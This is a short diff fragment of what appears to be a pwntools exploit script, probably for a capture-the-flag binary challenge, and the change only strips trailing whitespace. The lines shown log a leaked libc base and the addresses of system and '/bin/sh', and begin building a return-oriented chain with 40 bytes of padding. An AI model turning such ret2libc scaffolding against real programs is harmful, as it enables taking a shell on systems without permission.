@@ -7,7 +7,7 @@ def info(fgets_libc, libc_base, system, bin_sh):
     log.info("fgets@libc:  0x%x" % fgets_libc)
     log.success("leaked libc: 0x%x" % libc_base)
     log.info("system@libc: 0x%x" % system)
-    log.info("binsh@libc:  0x%x" % bin_sh)   
+    log.info("binsh@libc:  0x%x" % bin_sh)
 
 def create_stage(func, ret, arg):
     chain =  "A"*40
